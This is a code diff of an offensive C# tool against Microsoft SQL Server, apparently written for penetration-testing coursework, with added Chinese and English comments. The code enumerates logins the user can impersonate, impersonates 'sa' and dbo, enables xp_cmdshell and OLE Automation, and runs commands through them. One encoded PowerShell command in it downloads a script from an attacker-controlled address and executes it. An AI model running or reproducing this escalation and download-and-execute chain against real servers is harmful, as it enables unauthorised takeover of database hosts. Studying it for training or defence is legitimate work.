@@ -72,20 +72,20 @@ namespace MSSQL
 
 			// Get logins that we can impersonate
 			res = executeQuery("SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'; ", con);
-			Console.WriteLine($"[*] User can impersonate the following logins: {res}.");
+			Console.WriteLine($"[*] User can impersonate the following logins: {res}.");//Fro next EXECUTE AS
 
 			// Impersonate login and get login information
 			String su = executeQuery("SELECT SYSTEM_USER;", con);
 			String un = executeQuery("SELECT USER_NAME();", con);
-			Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");
+			Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");//模擬前帳號
 			//EXECUTE AS語句來完成，它提供了一種在不同登錄名或用戶的上下文中執行 SQL 查詢的方法
 			res = executeQuery("EXECUTE AS LOGIN = 'sa';", con);
 			Console.WriteLine($"[*] Triggered impersonation.");
 			su = executeQuery("SELECT SYSTEM_USER;", con);
 			un = executeQuery("SELECT USER_NAME();", con);
-			Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");
+			Console.WriteLine($"[*] Current database login is '{su}' with system user '{un}'.");//模擬後帳號
 
-			// Impersonate dbo in trusted database and execute through 'xp_cmdshell'
+			// Impersonate dbo in trusted database and execute through 'xp_cmdshell'<==傳統xp_cmdshell打法
 		        res = executeQuery("use msdb; EXECUTE AS USER = 'dbo';", con);
 			Console.WriteLine("[*] Triggered impersonation.");
 			res = executeQuery("EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", con);
@@ -94,12 +94,12 @@ namespace MSSQL
 			res = executeQuery($"EXEC xp_cmdshell '{cmd}'", con);
 			Console.WriteLine($"[*] Executed command! Result: {res}");
 
-			// Impersonate dbo in trusted database and execute through 'sp_OACreate' 
+			// Impersonate dbo in trusted database and execute through 'sp_OACreate' <==osep新打法
 			res = executeQuery("use msdb; EXECUTE AS USER = 'dbo';", con);
 			Console.WriteLine("[*] Triggered impersonation.");
 			res = executeQuery("EXEC sp_configure 'Ole Automation Procedures', 1; RECONFIGURE;", con);
 			Console.WriteLine("[*] Enabled OLE automation procedures.");
-			String cmd = "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA2ADcALwBjAGgAYQBwAHQAZQByADcALwByAHUAbgAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA=";
+			cmd = "powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA0ADkALgA2ADcALwBjAGgAYQBwAHQAZQByADcALwByAHUAbgAuAHQAeAB0ACcAKQAgAHwAIABJAEUAWAA=";
 			res = executeQuery($"DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, '{cmd}';", con);
 			Console.WriteLine($"[*] Executed command!");
 
